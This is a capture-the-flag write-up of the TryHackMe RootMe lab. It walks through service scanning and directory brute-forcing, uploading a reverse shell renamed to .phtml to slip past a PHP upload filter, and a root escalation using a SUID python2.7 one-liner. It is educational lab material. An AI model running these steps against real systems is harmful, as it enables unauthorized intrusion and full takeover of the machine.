# CTF RootMe (TryHackMe)

## 1. Target and Attacker Information

**Target IP:**
`10.48.188.9`

**Attacker Machine:**
Kali Linux 25.3 (Running on UTM - Apple Silicon M5)

**Main Tools:**

* Nmap
* Gobuster
* Netcat
* Python

---

## 2. Enumeration (Information Gathering)

The first step was to identify the active services on the target server.

### Port Scanning

I used **Nmap** to identify the running services.

```bash
nmap -sV 10.48.188.9
```

#### Results

| Port | Service | Version               |
| ---- | ------- | ------------------- |
| 22   | SSH     | OpenSSH 7.6p1       |
| 80   | HTTP    | Apache httpd 2.4.29 |

---

### Directory Discovery

I used **Gobuster** to discover hidden directories through directory brute forcing.

```bash
gobuster dir -u http://10.48.188.9 -w /usr/share/wordlists/dirb/common.txt
```

#### Results

Two important directories were found:

* `/panel/` → File upload form
* `/uploads/` → Storage location for uploaded files

---

## 3. Exploitation (Gaining Access)

At this stage, I attempted to gain system access through a **file upload vulnerability**.

### Vulnerability

The server blocked files with the following extension:

```
.php
```

### Bypassing the Filter

The filter was bypassed by changing the reverse shell's file extension to:

```
.phtml
```

---

### Exploitation Steps

1. Upload a **reverse shell** file named:

```
shell.phtml
```

through the following page:

```
/panel/
```

2. Prepare a listener on the Kali Linux machine:

```bash
nc -lvnp 1234
```

3. Open the shell file in the browser:

```
http://10.48.188.9/uploads/shell.phtml
```

---

### Results

The **reverse shell** connected with the privileges of:

```
www-data
```

---

## 4. Privilege Escalation

After gaining access as a regular user, the next step was to find a way to escalate privileges to **root**.

### SUID Analysis

Search for binaries with the **SUID bit set** using:

```bash
find / -perm -4000 2>/dev/null
```

#### Findings

The following binary had the **SUID** permission bit set:

```
/usr/bin/python2.7
```

---

### Exploitation

Use Python to start a shell while retaining the elevated privileges provided by SUID.

```bash
python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

---

### Results

Access was obtained as:

```
root
```

Verify the result with:

```bash
whoami
```

Output:

```
root
```

---

## 5. Finding the Flags

### User Flag

File location:

```
/var/www/user.txt
```

---

### Root Flag

File location:

```
/root/root.txt
```

---

## Conclusion

The **RootMe** machine had a **file upload vulnerability** that allowed an attacker to upload a **reverse shell** by bypassing the file extension filter. After gaining access as `www-data`, the attacker could perform **privilege escalation** through the `python2.7` binary, whose **SUID bit was set**, allowing a shell to run with **root** privileges.

---
